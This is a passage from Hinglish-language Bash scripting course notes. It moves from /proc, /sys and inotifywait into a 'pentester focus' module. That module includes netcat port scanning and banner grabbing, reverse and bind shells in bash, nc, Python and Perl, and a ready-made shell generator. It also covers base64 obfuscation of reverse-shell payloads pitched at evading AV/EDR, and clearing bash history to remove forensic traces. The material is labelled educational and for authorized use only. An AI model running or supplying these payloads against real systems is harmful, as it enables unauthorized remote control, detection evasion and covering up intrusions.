# Disk
cat /sys/block/sda/size
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System information

get_cpu_info() {
    echo "=== CPU ==="
    grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2
    echo "Cores: $(grep -c processor /proc/cpuinfo)"
}

get_memory_info() {
    echo "=== Memory ==="
    local total=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    echo "Total: $((total / 1024)) MB"
}

main() {
    get_cpu_info
    get_memory_info
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Write karne ki koshish:** Read-only mostly
- ❌ **Parse errors:** Format vary
- ❌ **Permissions ignore:** Some need root

### 10. **Best Practices / Pro Tips**
- 💡 **Read-only mostly:** Write carefully
- 💡 **Parse carefully:** Format changes
- 💡 **Use tools:** Better than direct
- 💡 **Documentation:** Kernel docs

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Monitor process

monitor_process() {
    local pid=$1
    while [ -d "/proc/$pid" ]; do
        local mem=$(grep VmRSS /proc/$pid/status | awk '{print $2}')
        echo "[$(date '+%H:%M:%S')] MEM: ${mem}KB"
        sleep 5
    done
}

monitor_process 1234
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ /proc for process info
- ✅ /sys for hardware
- ✅ Virtual filesystems
- ✅ Runtime information
- ✅ Kernel interface

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: /proc files real hain?**
A: Nahi, virtual - runtime info.

**Q2: /proc vs /sys?**
A: /proc process/kernel, /sys hardware.

**Q3: Write kar sakte hain?**
A: Kuch files, carefully.

### 14. **Practice ke liye Task**

```bash
# 1. CPU
cat /proc/cpuinfo

# 2. Memory
cat /proc/meminfo

# 3. Process
cat /proc/1234/cmdline

# 4. Network
ls /sys/class/net/

# 5. Uptime
cat /proc/uptime
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📁 /proc for processes
- 🔧 /sys for hardware
- 💾 Virtual filesystems
- 📊 Runtime info
- 🎯 System introspection

> **💡 Ye Zaroor Yaad Rakhein:**
> /proc aur /sys system window! Virtual files, real info. /proc process, /sys hardware. Read-only mostly!

---

## **Topic 6: `inotifywait` (Real-time file monitoring)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**inotifywait** - Real-time file changes monitor.

### 2. **Ye Kya Hai? (What is it?)**
`inotifywait` file system events ko real-time monitor karta hai - create, modify, delete. Automation ke liye powerful.

**Analogy:** inotifywait security camera - har change instantly detect.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Real-time** - Instant detection
- ✅ **Automation** - Event-driven
- ✅ **Security** - Unauthorized changes
- ✅ **Sync** - File synchronization

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File changes monitor
- Auto-deployment
- Security monitoring
- Backup triggers

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Polling overhead
- Delayed detection
- Missed changes
- Inefficient monitoring

### 6. **Syntax aur Common Options**

```bash
# Basic
inotifywait file.txt
inotifywait -m directory/

# Events
inotifywait -e modify file.txt
inotifywait -e create,delete dir/

# Options
inotifywait -r directory/
inotifywait -q file.txt
```

### 7. **Example 1 (Basic)**

```bash
# Monitor file
inotifywait file.txt

# Continuous
inotifywait -m file.txt

# Directory
inotifywait -m /var/www/

# Specific events
inotifywait -e modify file.txt

# Recursive
inotifywait -r -m /home/user/
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Auto-deploy on change

auto_deploy() {
    local watch_dir=$1
    inotifywait -m -r -e close_write "$watch_dir" | while read path action file; do
        echo "Change: $file"
        /usr/local/bin/deploy.sh
    done
}

auto_backup() {
    local watch_file=$1
    inotifywait -m -e modify "$watch_file" | while read; do
        cp "$watch_file" "$watch_file.backup.$(date +%s)"
    done
}

main() {
    auto_deploy "${1:-.}"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Package nahi:** Install `inotify-tools`
- ❌ **Too many watches:** System limits
- ❌ **Event selection:** Specific use karo

### 10. **Best Practices / Pro Tips**
- 💡 **`-m` continuous:** Monitoring
- 💡 **Specific events:** `-e` filter
- 💡 **`--exclude`:** Unwanted skip
- 💡 **System limits:** Check max_user_watches

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Auto-deployment

readonly REPO_DIR="/var/www/app"

auto_deploy_system() {
    inotifywait -m -r -e close_write "$REPO_DIR" | while read path action file; do
        echo "Change: $file"
        /usr/local/bin/deploy.sh
    done
}

auto_deploy_system
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ inotifywait monitors files
- ✅ `-m` for continuous
- ✅ `-e` for events
- ✅ Real-time detection
- ✅ Event-driven automation

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Install kaise?**
A: `sudo apt install inotify-tools`

**Q2: System limits?**
A: Check `/proc/sys/fs/inotify/max_user_watches`

**Q3: Performance?**
A: Better than polling.

### 14. **Practice ke liye Task**

```bash
# 1. Monitor
inotifywait file.txt

# 2. Continuous
inotifywait -m directory/

# 3. Event
inotifywait -e modify file.txt

# 4. Recursive
inotifywait -r -m /home/

# 5. Auto-backup
inotifywait -m -e modify file.txt | while read; do
    cp file.txt file.txt.backup
done
```

### 15. **Aakhri Choti Summary (5 lines)**
- 👁️ inotifywait monitors real-time
- ⚡ Event-driven automation
- 🔄 `-m` continuous
- 🎯 `-e` specific events
- 🚀 Essential automation

> **💡 Ye Zaroor Yaad Rakhein:**
> inotifywait real-time king! Event-driven powerful. `-m` continuous. Filter events. System limits aware!

---

# **🎉 Module 15 Complete! 🎉**

## **Aapne Kya Seekha:**
✅ **stat** - Timestamps
✅ **Links** - Hard/Symbolic
✅ **lsof** - Open files
✅ **strace/ltrace** - Tracing
✅ **/proc & /sys** - Virtual FS
✅ **inotifywait** - Real-time

## **Essentials:**

```bash
stat -c "%y" file.txt
ln -s file.txt link
lsof -i :80
strace -c command
cat /proc/cpuinfo
inotifywait -m file.txt
```

**💡 Remember:** System internals deep understanding! stat timestamps, lsof debugging, strace analysis, inotifywait automation! 🚀

---
=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 16)**

---

## **PART 4: ADVANCED TOOLS & REAL-WORLD AUTOMATION**

---

# **Module 16: Networking & Security (Pentester Focus)**

---

## **Topic 1: `curl` & `wget` (Web requests)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**curl & wget** - HTTP requests aur file downloads.

### 2. **Ye Kya Hai? (What is it?)**
`curl` aur `wget` command-line tools hain web requests ke liye. curl flexible hai (APIs, testing), wget simple hai (downloads). Both automation ke liye essential.

**Analogy:** curl/wget ek web browser hain command line ke liye - websites access, files download, APIs test.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **API testing** - REST APIs test
- ✅ **Downloads** - Files download
- ✅ **Automation** - Web scraping
- ✅ **Monitoring** - Health checks

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- API testing
- File downloads
- Web scraping
- Health monitoring

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual testing
- No automation
- Inefficient downloads
- Limited monitoring

### 6. **Syntax aur Common Options**

```bash
# curl
curl URL
curl -o file.txt URL
curl -O URL
curl -I URL
curl -X POST URL
curl -H "Header: value" URL
curl -d "data" URL

# wget
wget URL
wget -O file.txt URL
wget -c URL
wget -r URL
wget -q URL
```

### 7. **Example 1 (Basic)**

```bash
# curl - get page
curl https://example.com

# Save to file
curl -o page.html https://example.com
curl -O https://example.com/file.zip

# Headers only
curl -I https://example.com

# Follow redirects
curl -L https://example.com

# POST request
curl -X POST https://api.example.com/data

# With headers
curl -H "Content-Type: application/json" https://api.example.com

# With data
curl -d "name=john&age=30" https://api.example.com

# wget - download
wget https://example.com/file.zip

# Save as
wget -O myfile.zip https://example.com/file.zip

# Resume download
wget -c https://example.com/large.iso

# Quiet mode
wget -q https://example.com/file.txt

# Recursive download
wget -r https://example.com/docs/
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# API testing and monitoring

set -euo pipefail

# Test API endpoint
test_api() {
    local url=$1
    local response=$(curl -s -w "\n%{http_code}" "$url")
    local body=$(echo "$response" | head -n -1)
    local code=$(echo "$response" | tail -n 1)
    
    echo "Status: $code"
    echo "Response: $body"
    
    [ "$code" = "200" ]
}

# POST with JSON
post_json() {
    local url=$1
    local data=$2
    
    curl -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data"
}

# Download with retry
download_retry() {
    local url=$1
    local output=$2
    local retries=3
    
    for i in $(seq 1 $retries); do
        if wget -q -O "$output" "$url"; then
            echo "✓ Downloaded"
            return 0
        fi
        echo "Retry $i..."
        sleep 2
    done
    
    return 1
}

# Health check
health_check() {
    local url=$1
    
    if curl -sf "$url" >/dev/null; then
        echo "✓ $url is UP"
    else
        echo "✗ $url is DOWN"
    fi
}

main() {
    test_api "https://api.github.com"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **SSL verify ignore:** `-k` dangerous
- ❌ **No error handling:** Check exit codes
- ❌ **Timeouts nahi:** `--max-time` use karo

### 10. **Best Practices / Pro Tips**
- 💡 **`-s` for silent:** Scripts mein
- 💡 **`-f` for fail:** Non-200 fail kare
- 💡 **`-L` for redirects:** Follow karo
- 💡 **Timeouts set:** `--max-time 10`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# API monitoring

monitor_api() {
    local endpoints=(
        "https://api.example.com/health"
        "https://api.example.com/status"
    )
    
    for endpoint in "${endpoints[@]}"; do
        local code=$(curl -s -o /dev/null -w "%{http_code}" "$endpoint")
        
        if [ "$code" = "200" ]; then
            echo "✓ $endpoint: OK"
        else
            echo "✗ $endpoint: $code"
            echo "Alert: $endpoint down" | mail -s "API Alert" admin@example.com
        fi
    done
}

monitor_api
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ curl for APIs
- ✅ wget for downloads
- ✅ `-s` silent mode
- ✅ `-f` fail on error
- ✅ Essential for automation

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: curl vs wget?**
A: curl flexible (APIs), wget simple (downloads).

**Q2: POST request kaise?**
A: `curl -X POST -d "data" URL`

**Q3: JSON kaise send karu?**
A: `curl -H "Content-Type: application/json" -d '{"key":"value"}' URL`

### 14. **Practice ke liye Task**

```bash
# 1. GET request
curl https://api.github.com

# 2. Save output
curl -o page.html https://example.com

# 3. POST
curl -X POST -d "name=test" https://httpbin.org/post

# 4. Download
wget https://example.com/file.zip

# 5. Headers
curl -I https://example.com

# 6. JSON
curl -H "Content-Type: application/json" -d '{"test":"data"}' https://httpbin.org/post
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🌐 curl for web requests
- 📥 wget for downloads
- 🔧 curl flexible, wget simple
- 📡 Essential for APIs
- 🎯 Automation backbone

> **💡 Ye Zaroor Yaad Rakhein:**
> curl/wget web automation! curl APIs ke liye, wget downloads ke liye. `-s` silent, `-f` fail on error. Timeouts set karo. Health checks essential!

---

## **Topic 2: `netcat (nc)` (Port Scan, Banner Grab, File Transfer)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**netcat** - Swiss Army knife of networking.

### 2. **Ye Kya Hai? (What is it?)**
`netcat` (nc) ek versatile networking tool hai - port scanning, banner grabbing, file transfer, chat, reverse shells. Pentesting ka essential tool.

**Analogy:** netcat ek universal adapter hai networking ka - kisi bhi port se connect, kuch bhi transfer.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Port scanning** - Open ports find
- ✅ **Banner grabbing** - Service info
- ✅ **File transfer** - Quick transfers
- ✅ **Debugging** - Network testing

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Port scanning
- Service identification
- File transfers
- Network debugging

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Limited network testing
- Manual port checks
- Slow file transfers
- Poor debugging

### 6. **Syntax aur Common Options**

```bash
# Connect
nc host port

# Listen
nc -l -p port

# Port scan
nc -zv host port-range

# Banner grab
nc host port

# File transfer
nc -l -p 1234 > file.txt
nc host 1234 < file.txt

# Chat
nc -l -p 1234
nc host 1234
```

### 7. **Example 1 (Basic)**

```bash
# Connect to port
nc example.com 80

# Listen on port
nc -l -p 1234

# Port scan
nc -zv example.com 20-25
nc -zv example.com 80

# Banner grab
echo "" | nc example.com 22
echo "" | nc example.com 80

# File transfer - receiver
nc -l -p 1234 > received.txt

# File transfer - sender
nc 192.168.1.100 1234 < file.txt

# Chat server
nc -l -p 1234

# Chat client
nc 192.168.1.100 1234

# Test connectivity
nc -zv google.com 443
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Network scanning and testing

set -euo pipefail

# Port scanner
port_scan() {
    local host=$1
    local start=${2:-1}
    local end=${3:-1000}
    
    echo "Scanning $host ports $start-$end..."
    
    for port in $(seq $start $end); do
        if nc -zv -w 1 "$host" "$port" 2>&1 | grep -q succeeded; then
            echo "✓ Port $port: OPEN"
        fi
    done
}

# Banner grabber
banner_grab() {
    local host=$1
    local port=$2
    
    echo "Grabbing banner from $host:$port..."
    echo "" | nc -w 2 "$host" "$port"
}

# Service detector
detect_service() {
    local host=$1
    
    echo "=== Service Detection ==="
    
    # Common ports
    local ports=(21 22 23 25 80 443 3306 5432)
    
    for port in "${ports[@]}"; do
        if nc -zv -w 1 "$host" "$port" 2>&1 | grep -q succeeded; then
            echo "Port $port: $(banner_grab $host $port | head -1)"
        fi
    done
}

# File transfer
send_file() {
    local file=$1
    local host=$2
    local port=$3
    
    echo "Sending $file to $host:$port..."
    nc "$host" "$port" < "$file"
}

receive_file() {
    local port=$1
    local output=$2
    
    echo "Listening on port $port..."
    nc -l -p "$port" > "$output"
}

# Network test
test_connectivity() {
    local host=$1
    local port=$2
    
    if nc -zv -w 2 "$host" "$port" 2>&1 | grep -q succeeded; then
        echo "✓ $host:$port is reachable"
        return 0
    else
        echo "✗ $host:$port is not reachable"
        return 1
    fi
}

main() {
    local action=${1:-help}
    
    case $action in
        scan)
            port_scan "$2" "$3" "$4"
            ;;
        banner)
            banner_grab "$2" "$3"
            ;;
        detect)
            detect_service "$2"
            ;;
        *)
            echo "Usage: $0 {scan|banner|detect} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Firewall ignore:** Blocked ports
- ❌ **Timeout nahi:** `-w` use karo
- ❌ **Permissions:** Some ports need root

### 10. **Best Practices / Pro Tips**
- 💡 **`-z` for scan:** Zero I/O mode
- 💡 **`-v` for verbose:** Details dekho
- 💡 **`-w` timeout:** Hanging avoid
- 💡 **Legal use:** Permission leke use karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Network reconnaissance

recon() {
    local target=$1
    
    echo "=== Reconnaissance: $target ==="
    
    # Check common ports
    echo "Checking common ports..."
    for port in 21 22 23 25 80 443 3306; do
        if nc -zv -w 1 "$target" "$port" 2>&1 | grep -q succeeded; then
            echo "✓ Port $port: OPEN"
            echo "  Banner: $(echo "" | nc -w 1 $target $port | head -1)"
        fi
    done
}

recon "example.com"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ nc for networking
- ✅ `-z` port scan
- ✅ `-l` listen mode
- ✅ Banner grabbing
- ✅ File transfers

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Port scan legal hai?**
A: Apne systems par yes, others par permission chahiye.

**Q2: File transfer kaise?**
A: Receiver: `nc -l -p 1234 > file`, Sender: `nc host 1234 < file`

**Q3: Banner grab kyun?**
A: Service version identify karne ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. Port scan
nc -zv example.com 80

# 2. Banner grab
echo "" | nc example.com 80

# 3. Listen
nc -l -p 1234

# 4. Connect
nc localhost 1234

# 5. Port range scan
nc -zv example.com 20-25

# 6. Test connectivity
nc -zv google.com 443
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔧 nc Swiss Army knife
- 🔍 Port scanning
- 📡 Banner grabbing
- 📁 File transfers
- 🎯 Pentesting essential

> **💡 Ye Zaroor Yaad Rakhein:**
> netcat networking ka powerhouse! Port scan, banner grab, file transfer. `-z` scan ke liye, `-l` listen ke liye. Legal use only. Permission zaroori!

---

## **Topic 3: Reverse & Bind Shells (using `bash -i >&/dev/tcp/...` & `nc`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Reverse & Bind Shells** - Remote command execution techniques.

### 2. **Ye Kya Hai? (What is it?)**
Reverse shell attacker ko connect karta hai, bind shell port par listen karta hai. Bash TCP redirection aur netcat use karke implement hote hain. Pentesting aur red team operations mein use.

**Analogy:** Reverse shell ek phone call hai (victim calls attacker), bind shell ek hotline hai (attacker calls victim).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Remote access** - System control
- ✅ **Pentesting** - Security testing
- ✅ **Firewall bypass** - Outbound connections
- ✅ **Post-exploitation** - Persistence

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Pentesting (authorized)
- Security research
- CTF competitions
- Red team exercises

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Limited pentesting skills
- No remote access techniques
- Incomplete security knowledge
- CTF failures

### 6. **Syntax aur Common Options**

```bash
# Reverse shell - Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Reverse shell - Netcat
nc ATTACKER_IP PORT -e /bin/bash

# Bind shell - Netcat
nc -l -p PORT -e /bin/bash

# Listener (attacker)
nc -lvp PORT
```

### 7. **Example 1 (Basic)**

```bash
# ATTACKER MACHINE - Listener
nc -lvp 4444

# VICTIM MACHINE - Reverse shell (Bash)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# VICTIM MACHINE - Reverse shell (Netcat)
nc 192.168.1.100 4444 -e /bin/bash

# VICTIM MACHINE - Bind shell
nc -l -p 4444 -e /bin/bash

# ATTACKER MACHINE - Connect to bind shell
nc 192.168.1.200 4444

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Shell generator (Educational purposes only)

set -euo pipefail

# Generate reverse shell
gen_reverse_shell() {
    local ip=$1
    local port=$2
    local type=${3:-bash}
    
    case $type in
        bash)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        nc)
            echo "nc $ip $port -e /bin/bash"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ;;
    esac
}

# Generate bind shell
gen_bind_shell() {
    local port=$1
    
    echo "nc -l -p $port -e /bin/bash"
}

# Setup listener
setup_listener() {
    local port=$1
    
    echo "Setting up listener on port $port..."
    nc -lvp "$port"
}

# Upgrade shell
upgrade_shell() {
    cat <<'EOF'
# Upgrade to interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
# OR
script -qc /bin/bash /dev/null

# Background shell: Ctrl+Z
# On attacker:
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
EOF
}

main() {
    local action=${1:-help}
    
    case $action in
        reverse)
            gen_reverse_shell "$2" "$3" "${4:-bash}"
            ;;
        bind)
            gen_bind_shell "$2"
            ;;
        listen)
            setup_listener "$2"
            ;;
        upgrade)
            upgrade_shell
            ;;
        *)
            cat <<EOF
Usage: $0 {reverse|bind|listen|upgrade} [args]

Examples:
  $0 reverse 192.168.1.100 4444 bash
  $0 bind 4444
  $0 listen 4444
  $0 upgrade

⚠️  EDUCATIONAL PURPOSES ONLY
⚠️  USE ONLY ON AUTHORIZED SYSTEMS
EOF
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Firewall ignore:** Outbound blocked
- ❌ **Non-interactive shell:** Upgrade karo
- ❌ **Illegal use:** Authorization zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **Reverse > Bind:** Firewall bypass
- 💡 **Upgrade shell:** Interactive banao
- 💡 **Obfuscation:** Detection avoid
- 💡 **Legal only:** Permission leke use

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# CTF shell handler (Educational)

# Attacker - Setup listener
listener() {
    local port=${1:-4444}
    echo "Listening on port $port..."
    nc -lvp "$port"
}

# Generate payload
payload() {
    local ip=$1
    local port=$2
    
    echo "Payload for $ip:$port"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
}

# Usage
echo "=== CTF Shell Handler ==="
echo "1. Start listener: $0 listen 4444"
echo "2. Get payload: $0 payload YOUR_IP 4444"
echo "3. Execute payload on target"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Reverse shell: victim connects
- ✅ Bind shell: attacker connects
- ✅ Bash TCP redirection
- ✅ Netcat shells
- ✅ Authorization required

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Reverse vs Bind?**
A: Reverse firewall bypass, Bind direct access.

**Q2: Shell upgrade kaise?**
A: `python -c 'import pty; pty.spawn("/bin/bash")'`

**Q3: Legal hai?**
A: Sirf authorized systems par.

### 14. **Practice ke liye Task**

```bash
# ⚠️  ONLY ON YOUR OWN SYSTEMS

# 1. Listener
nc -lvp 4444

# 2. Reverse shell (another terminal)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# 3. Bind shell
nc -l -p 5555 -e /bin/bash

# 4. Connect
nc 127.0.0.1 5555
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔄 Reverse: victim connects
- 🔗 Bind: attacker connects
- 🐚 Bash TCP redirection
- 🎯 Pentesting technique
- ⚠️ Authorization required

> **💡 Ye Zaroor Yaad Rakhein:**
> Shells pentesting technique! Reverse firewall bypass. Bind direct access. Upgrade shell for interactive. LEGAL USE ONLY - authorization zaroori!

---

## **Topic 4: Bash Obfuscation (using `base64`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Bash Obfuscation** - Code ko encode karke hide karna.

### 2. **Ye Kya Hai? (What is it?)**
Obfuscation code ko encode/encrypt karke readable nahi banata. `base64` simple encoding hai jo scripts hide karta hai. Detection avoid karne ke liye use hota hai pentesting mein.

**Analogy:** Obfuscation ek secret code hai - message same, but readable nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Evasion** - Detection avoid
- ✅ **Obfuscation** - Code hide
- ✅ **Bypass** - Filters bypass
- ✅ **Pentesting** - Red team ops

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Pentesting
- Red team operations
- CTF competitions
- Security research

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Easy detection
- Filter blocks
- Limited evasion
- Incomplete pentesting

### 6. **Syntax aur Common Options**

```bash
# Encode
echo "command" | base64

# Decode
echo "encoded" | base64 -d

# Execute encoded
echo "encoded" | base64 -d | bash

# Encode file
base64 file.sh > encoded.txt

# Decode file
base64 -d encoded.txt > decoded.sh
```

### 7. **Example 1 (Basic)**

```bash
# Encode command
echo "whoami" | base64
# Output: d2hvYW1pCg==

# Decode
echo "d2hvYW1pCg==" | base64 -d
# Output: whoami

# Execute encoded
echo "d2hvYW1pCg==" | base64 -d | bash

# Encode script
echo 'echo "Hello World"' | base64
# Output: ZWNobyAiSGVsbG8gV29ybGQiCg==

# Execute
echo "ZWNobyAiSGVsbG8gV29ybGQiCg==" | base64 -d | bash

# Multi-line
cat script.sh | base64
base64 script.sh

# Decode and execute
base64 -d encoded.txt | bash

# One-liner obfuscation
bash -c "$(echo 'ZWNobyAiSGVsbG8i' | base64 -d)"
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Obfuscation toolkit

set -euo pipefail

# Encode script
encode_script() {
    local script=$1
    local output=${2:-encoded.txt}
    
    base64 "$script" > "$output"
    echo "✓ Encoded: $output"
}

# Decode script
decode_script() {
    local encoded=$1
    local output=${2:-decoded.sh}
    
    base64 -d "$encoded" > "$output"
    chmod +x "$output"
    echo "✓ Decoded: $output"
}

# Generate obfuscated payload
gen_payload() {
    local command=$1
    
    local encoded=$(echo "$command" | base64)
    echo "echo '$encoded' | base64 -d | bash"
}

# Multi-layer encoding
multi_encode() {
    local command=$1
    local layers=${2:-2}
    
    local result="$command"
    
    for i in $(seq 1 $layers); do
        result=$(echo "$result" | base64)
    done
    
    echo "$result"
}

# Multi-layer decode
multi_decode() {
    local encoded=$1
    local layers=${2:-2}
    
    local result="$encoded"
    
    for i in $(seq 1 $layers); do
        result=$(echo "$result" | base64 -d)
    done
    
    echo "$result"
}

# Obfuscated reverse shell
obfuscated_shell() {
    local ip=$1
    local port=$2
    
    local shell="bash -i >& /dev/tcp/$ip/$port 0>&1"
    local encoded=$(echo "$shell" | base64)
    
    echo "Obfuscated payload:"
    echo "echo '$encoded' | base64 -d | bash"
}

# Execute obfuscated
exec_obfuscated() {
    local encoded=$1
    
    echo "$encoded" | base64 -d | bash
}

main() {
    local action=${1:-help}
    
    case $action in
        encode)
            encode_script "$2" "$3"
            ;;
        decode)
            decode_script "$2" "$3"
            ;;
        payload)
            gen_payload "$2"
            ;;
        shell)
            obfuscated_shell "$2" "$3"
            ;;
        *)
            cat <<EOF
Usage: $0 {encode|decode|payload|shell} [args]

Examples:
  $0 encode script.sh encoded.txt
  $0 decode encoded.txt decoded.sh
  $0 payload "whoami"
  $0 shell 192.168.1.100 4444

⚠️  EDUCATIONAL PURPOSES ONLY
EOF
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Base64 = encryption:** Encoding hai, encryption nahi
- ❌ **Over-reliance:** Detection still possible
- ❌ **Illegal use:** Authorization zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **Multi-layer:** Multiple encoding
- 💡 **Combine techniques:** Base64 + compression
- 💡 **Test detection:** AV/EDR test karo
- 💡 **Legal only:** Authorized systems

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# CTF payload generator

generate_ctf_payload() {
    local command=$1
    
    # Encode
    local encoded=$(echo "$command" | base64)
    
    # Generate payload
    cat <<EOF
# Obfuscated payload
payload="$encoded"
echo \$payload | base64 -d | bash
EOF
}

# Example
generate_ctf_payload "cat /flag.txt"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ base64 for encoding
- ✅ Not encryption
- ✅ Detection evasion
- ✅ Multi-layer possible
- ✅ Legal use only

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: base64 secure hai?**
A: Nahi, sirf encoding hai, encryption nahi.

**Q2: Detection avoid hoga?**
A: Kuch cases mein, but not foolproof.

**Q3: Legal hai?**
A: Authorized systems par only.

### 14. **Practice ke liye Task**

```bash
# 1. Encode
echo "whoami" | base64

# 2. Decode
echo "d2hvYW1pCg==" | base64 -d

# 3. Execute
echo "d2hvYW1pCg==" | base64 -d | bash

# 4. Encode script
echo 'echo "test"' | base64

# 5. Multi-layer
echo "test" | base64 | base64

# 6. Decode multi
echo "encoded" | base64 -d | base64 -d
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔐 base64 encodes, not encrypts
- 🎭 Obfuscation technique
- 🚫 Detection evasion
- 🔄 Multi-layer possible
- ⚠️ Legal use only

> **💡 Ye Zaroor Yaad Rakhein:**
> Obfuscation detection avoid! base64 simple encoding. Multi-layer better. Not encryption. LEGAL USE - authorization zaroori!

---

## **Topic 5: Bash History & Anti-Forensics (`.bash_history`, `unset HISTFILE`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Bash History & Anti-Forensics** - Command history manage aur hide karna.

### 2. **Ye Kya Hai? (What is it?)**
Bash history commands track karta hai `.bash_history` mein. Anti-forensics techniques history hide/delete karti hain. `unset HISTFILE` history disable karta hai. Pentesting aur privacy ke liye.

**Analogy:** Bash history ek diary hai - anti-forensics pages faad dena ya diary hi nahi rakhna.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Privacy** - Commands hide
- ✅ **Anti-forensics** - Tracks remove
- ✅ **Pentesting** - Stealth operations
- ✅ **OPSEC** - Operational security

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Pentesting
- Privacy concerns
- Red team ops
- Sensitive operations

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Command history exposed
- Forensic evidence
- Poor OPSEC
- Easy detection

### 6. **Syntax aur Common Options**

```bash
# View history
history

# Clear history
history -c

# Delete specific
history -d LINE_NUMBER

# Disable history
unset HISTFILE
set +o history

# Enable history
set -o history

# Don't save command (space prefix)
 command

# History file
~/.bash_history
```

### 7. **Example 1 (Basic)**

```bash
# View history
history

# Clear current session
history -c

# Clear and delete file
history -c
rm ~/.bash_history

# Disable history
unset HISTFILE
set +o history

# Commands won't be saved now
whoami
id

# Re-enable
